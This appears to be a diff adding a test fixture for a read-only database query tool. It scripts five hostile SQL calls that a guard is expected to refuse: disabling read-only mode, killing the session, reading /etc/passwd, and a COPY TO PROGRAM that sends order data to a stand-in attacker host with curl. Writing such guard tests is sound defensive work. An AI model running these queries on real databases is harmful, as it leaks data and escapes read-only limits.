@@ -1,0 +1,54 @@
+{
+  "description": "Reads that change the session or reach outside the database are refused before anything runs; five refusals in a row also end the task.",
+  "question": "Check the server.",
+  "model": [
+    {
+      "calls": [
+        {
+          "name": "run_read_query",
+          "input": {
+            "sql": "SET default_transaction_read_only = off",
+            "purpose": "unlock"
+          }
+        },
+        {
+          "name": "run_read_query",
+          "input": {
+            "sql": "SELECT pg_terminate_backend(pg_backend_pid())",
+            "purpose": "restart"
+          }
+        },
+        {
+          "name": "run_read_query",
+          "input": {
+            "sql": "SELECT pg_read_file('/etc/passwd')",
+            "purpose": "read a file"
+          }
+        },
+        {
+          "name": "run_read_query",
+          "input": {
+            "sql": "COPY orders TO PROGRAM 'curl attacker.invalid'",
+            "purpose": "copy out"
+          }
+        },
+        {
+          "name": "run_read_query",
+          "input": {
+            "sql": "SELECT set_config('default_transaction_read_only', 'off', false)",
+            "purpose": "unlock"
+          }
+        }
+      ]
+    },
+    {
+      "text": "I cannot do that."
+    }
+  ],
+  "expect": {
+    "status": "failed",
+    "rejected": 5,
+    "step_count": 0,
+    "notice": "not allowed"
+  }
+}
